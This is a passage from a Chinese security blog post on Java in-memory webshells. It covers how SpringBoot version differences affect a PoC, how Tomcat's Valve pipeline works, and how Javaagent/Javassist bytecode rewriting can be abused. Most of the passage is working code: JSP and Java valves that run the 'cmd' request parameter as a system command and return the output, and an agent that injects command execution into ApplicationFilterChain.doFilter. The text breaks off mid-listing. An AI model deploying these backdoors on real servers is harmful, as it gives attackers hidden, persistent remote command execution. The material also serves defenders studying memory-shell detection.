，就会让代码走到这里 <code>patternParser</code> 不为 <code>null</code> 。</p><p><img src="/imgs/1694455122741.png"></p><p>然后我们查看 <code>patternParser</code> 这个属性的所在位置，果然就发现了原因。</p><p><code>patternParser</code> 在 <code>AbstractHandlerMapping</code> 这个抽象类中，低版本 <code>SpringBoot</code> 这个属性默认没有赋值，而高版本在定义这个属性的时候就直接 <code>new</code> 了对象，因此这个属性才一开始就不为 <code>null</code> 。</p><ul><li>高版本</li></ul><p><img src="/imgs/1694456752673.png"></p><ul><li>低版本</li></ul><p><img src="/imgs/1694456768822.png"></p><blockquote><p>到这里我们算是搞清楚了两个版本之间 <code>poc</code> 不同的原因，那 <code>poc</code> 要怎么修改呢？再继续下面的分析。</p></blockquote><p>接着我们可以创建 <code>requestMappingInfo</code> 的位置打个断点，也就是 <code>RequestMappingHandlerMapping#createRequestMappingInfo()</code> 处，来查看 <code>patternParser</code> 的不同对实际创建 <code>requestMappingInfo</code> 发生了什么影响。</p><p>我们现在这里都用低版本的 <code>poc</code> 来分别在高版本和低版本的 <code>SpringBoot</code> 中 <code>debug</code> 一下。发现高版本的 <code>RequestMappingHandlerMapping.config.patternParser</code> 默认不为 <code>null</code> ，而低版本的为 <code>null</code> 。</p><ul><li>高版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694452875807.png"></p><ul><li>低版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694452899108.png"></p><p>我们再全局搜索一下看 <code>RequestMappingHandlerMapping.config.patternParser</code> 是在哪里被赋值的。最终找到了 <code>RequestMappingHandlerMapping#afterPropertiesSet()</code> 方法中。</p><p>我们发现 <code>SpringBoot</code> 在高版本中对这个方法进行了修改。</p><ul><li>高版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694453433938.png"></p><ul><li>低版本 <code>SpringBoot</code></li></ul><p><img src="/imgs/1694453463469.png"></p><blockquote><p>这里 <code>config</code> 代码的流程走向变了一是和 <code>afterPropertiesSet()</code> 这个函数的实现变了相关，二是和上面提到的 <code>patternParser</code> 的默认值变了相关。</p></blockquote><h3 id="Tomcat的Valve"><a href="#Tomcat的Valve" class="headerlink" title="Tomcat的Valve"></a>Tomcat的Valve</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>了解 <code>valve</code> 是干什么的先需要了解 <strong>责任链模式</strong> 。参考 <code>https://shusheng007.top/2021/09/08/chain-of-responsibility-pattern/</code> 。</p><blockquote><p><code>Tomcat</code> 在处理一个请求调用逻辑时，是如何处理和传递 <code>Request</code> 和 <code>Respone</code> 对象的呢？为了整体架构的每个组件的可伸缩性和可扩展性，<code>Tomcat</code> 使用了职责链模式来实现客户端请求的处理。在 <code>Tomcat</code> 中定义了两个接口：<code>Pipeline</code>（管道）和 <code>Valve</code>（阀）。这两个接口名字很好的诠释了处理模式：数据流就像是流经管道的水一样，经过管道上个一个个阀门。</p><p><code>Pipeline</code> 中会有一个最基础的 <code>Valve</code>（ <code>basic</code> ），它始终位于末端（最后执行），封装了具体的请求处理和输出响应的过程。<code>Pipeline</code> 提供了 <code>addValve</code> 方法，可以添加新 <code>Valve</code> 在 <code>basic</code> 之前，并按照添加顺序执行。</p></blockquote><p><img src="/imgs/Pasted%20image%2020230917232410.png"></p><blockquote><p><code>Tomcat</code> 每个层级的容器（ <code>Engine</code>、<code>Host</code> 、<code>Context</code> 、<code>Wrapper</code> ），都有基础的 <code>Valve</code> 实现（ <code>StandardEngineValve</code> 、<code>StandardHostValve</code> 、<code>StandardContextValve</code> 、<code>StandardWrapperValve</code> ），他们同时维护了一个 <code>Pipeline</code> 实例（ <code>StandardPipeline</code> ），也就是说，我们可以在任何层级的容器上针对请求处理进行扩展。这四个 <code>Valve</code> 的基础实现都继承了 <code>ValveBase</code> 。这个类帮我们实现了生命接口及 <code>MBean</code> 接口，使我们只需专注阀门的逻辑处理即可。</p></blockquote><p>具体见源码：</p><ul><li><code>StandardEngineValve</code></li></ul><p><img src="/imgs/1694964343246.png"></p><ul><li><code>StandardHostValve</code></li></ul><p><img src="/imgs/1694964391229.png"></p><ul><li><code>StandardWrapperValve</code></li></ul><p><img src="/imgs/1694964456764.png"></p><ul><li><code>StandardWrapperValve</code></li></ul><p><img src="/imgs/1694964425475.png"></p><p>根据上述的描述我们发现，<code>Valve</code> 也可能作为内存马，首先我们需要考虑如何拿到 <code>StandardPipeline</code> ，实际上根据我们调用栈和上文分析很容易发现，在 <code>StandardContext</code> 里就存在 <code>getPipeline()</code> 方法，所以我们老样子只需要拿到 <code>StandardContext</code> 即可。</p><p>最后总结下 <code>Valve</code> 型内存马(即动态创建 <code>valve</code> )的步骤:  </p><ol><li>获取 <code>StandardContext</code> </li><li>继承并编写一个恶意 <code>valve</code>   </li><li>调用 <code>StandardContext.addValve()</code> 添加恶意 <code>valve</code> 实例</li></ol><h4 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h4><p>这里不知道为什么在 <code>SpringBoot</code> 环境用反序列化打入 <code>java</code> 版本的内存马时总是给对方的服务器打崩了。报错：<code>java.lang.IncompatibleClassChangeError</code> 。但是实际在对方服务器上直接运行这个内存马的时候却是可以成功的。</p><ul><li><code>jsp</code> 版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.annotation.WebServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServlet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletRequest&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.servlet.http.HttpServletResponse&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">EvilValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">EvilValve</span>());</span><br><span class="line"></span><br><span class="line">    out.println(<span class="string">&quot;inject success&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><ul><li><code>java</code> 版本</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.shellPoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ValveMemshell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ValveMemshell</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> (WebappClassLoaderBase)Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 注意这里的contextClassLoader实际是ParallelWebappClassLoader类型的（WebappClassLoaderBase抽象类的子类），resources属性在WebappClassLoaderBase类中</span></span><br><span class="line">        <span class="comment">// 因此这里获取resources属性需要在其父类去找，getDeclaredField()无法获取父类的属性</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">resources</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 这里jsp和spring的resource路径不一样，jsp只需要一次getSuperclass，SpringBoot需要两次,所以这里最好都试一下</span></span><br><span class="line">            resources = contextClassLoader.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;非SpringBoot环境&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resources = contextClassLoader.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;resources&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;SpringBoot环境&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchFieldException e2)&#123;</span><br><span class="line">                e2.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        resources.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">StandardRoot</span> <span class="variable">standardRoot</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            standardRoot = (StandardRoot) resources.get(contextClassLoader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardRoot.getContext();</span><br><span class="line"></span><br><span class="line">        standardContext.getPipeline().addValve(<span class="keyword">new</span> <span class="title class_">ValveMemshell</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ValveMemshell</span><span class="params">(String aaa)</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">            isLinux = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(output);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于字节码动态修改技术（Javaagent-Javassist）实现内存马"><a href="#基于字节码动态修改技术（Javaagent-Javassist）实现内存马" class="headerlink" title="基于字节码动态修改技术（Javaagent+Javassist）实现内存马"></a>基于字节码动态修改技术（Javaagent+Javassist）实现内存马</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><blockquote><p>试想如果我们能找到一些关键类，这些关键类是 <code>Tomcat</code> 或相关容器处理请求的必经类，也就是要掉用相关类的相关方法，就可以完全摆脱 <code>url</code> 的限制，那么我们再通过 <code>javaagent</code> 和 <code>javassist</code> 实现运行时 <strong>动态修改字节码来完成类的修改和重载</strong> ，从中修改某方法的实现逻辑，嵌入命令执行并且回显，那么是不是同样可以实现内存马呢！</p></blockquote><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>首先我们要找到 <code>Tomcat</code> 中请求处理的必经类也就是通用类。如：上文提到过 <code>Tomcat</code> 中的 <code>WEB</code> 组件<code>Filter</code> 的实现，是一个 <code>FilterChain</code> 的链式调用，对请求做层层过滤。上一个 <code>filter</code> 调用该链的下一个 <code>filter</code> 的时候是通过 <code>filterChain.doFilter</code> 方法实现的。</p><p>而 <code>filterChain.doFilter()</code> 底层调用的是 <code>ApplicationFilterChain.internalDoFilter()</code> 方法，而且 <code>tomcat</code> 自带默认的 <code>filter</code> ，因此任何代码都一定会走到 <code>ApplicationFilterChain.internalDoFilter()</code> 这里。</p><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><p>这里我下面直接给出网上的代码，不知道为什么我总是像下面那篇文章一样复现不成功。总是报错 <code>class not found</code> 错误，即使我确定目标环境有那个类，最烦人的是有错误有时候目标靶机也不报错。但是我在后面想到了一个方法避免这个问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/02.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/01.java%E5%AE%89%E5%85%A8/05.%E5%86%85%E5%AD%98%E9%A9%AC/03.java%20agent%20%E5%86%85%E5%AD%98%E9%A9%AC#java-agent%E4%BF%AE%E6%94%B9dofilter</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AgentMain.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class cls : allLoadedClasses)&#123;</span><br><span class="line">            <span class="comment">// 定位到类</span></span><br><span class="line">            <span class="keyword">if</span> (cls.getName() == TransformerDemo.editClassName)&#123;</span><br><span class="line">                <span class="comment">// 添加Transformer</span></span><br><span class="line">                inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TransformerDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">                <span class="comment">// 触发Transformer</span></span><br><span class="line">                inst.retransformClasses(cls);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TransformerDemo.java</span></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="comment">// addTransformer()的第一个参数需要ClassFileTransformer这个类的对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">editClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">editMethod</span> <span class="operator">=</span> <span class="string">&quot;doFilter&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">memshell</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    java.lang.String cmd = req.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;       System.out.println(cmd);&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        try &#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            java.lang.Runtime.getRuntime().exec(cmd);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;            e.printStackTrace();\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    else&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;        internalDoFilter(req,res);\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加额外的类搜索路径</span></span><br><span class="line">        <span class="keyword">if</span> (classBeingRedefined != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ClassClassPath</span> <span class="variable">classClassPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(classBeingRedefined);</span><br><span class="line">            classPool.insertClassPath(classClassPath);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改方法doFilter()，返回 byte[] 字节码</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.get(editClassName);</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(editMethod);</span><br><span class="line">            ctMethod.insertBefore(memshell);</span><br><span class="line">            ctClass.writeFile(<span class="string">&quot;/Users/d4m1ts/d4m1ts/java/Temp/out/artifacts/temp_jar&quot;</span>);</span><br><span class="line">            System.out.println(memshell);</span><br><span class="line">            System.out.println(<span class="string">&quot;injection success&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.detach();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总是报错 <code>Class Not Found</code> ，那我们就尽量不要用其他的类。我们可以提前修改好 <code>ApplicationFilterChain</code> 这个类，将其修改后的字节码和 <code>agent.jar</code> 一样也上传到目标靶机。然后直接在 <code>transforme</code> 函数中读取这个文件中的字节码后返回，这样肯定就不会出现问题了。</p></blockquote><p>具体操作如下：</p><ol><li>先在本地创建好修改后的 <code>ApplicationFilterChain</code> 恶意类字节码。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 